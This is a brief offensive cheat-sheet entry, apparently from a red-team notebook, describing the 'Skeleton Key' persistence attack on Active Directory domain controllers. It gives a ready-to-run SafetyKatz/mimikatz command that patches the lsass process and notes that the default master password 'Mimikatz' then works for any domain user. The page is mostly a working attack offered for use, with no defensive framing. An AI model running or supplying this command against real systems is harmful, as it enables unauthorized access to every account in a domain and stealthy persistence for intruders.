# Skeleton Key

## Theory

Is a persistence technique where is possible to patch a Domain Controller (lsass process) so that it allow access as any user with a single password

## Abuse

Use the following mimikatz command to inject a skeleton key

{% code overflow="wrap" %}
```powershell
./SafetyKatz.exe '"privilege::debug" "misc::skeleton"' -ComputerName <$DC>
```
{% endcode %}

Now you can access on every machine of the domain with a valid user and the password "Mimikatz"
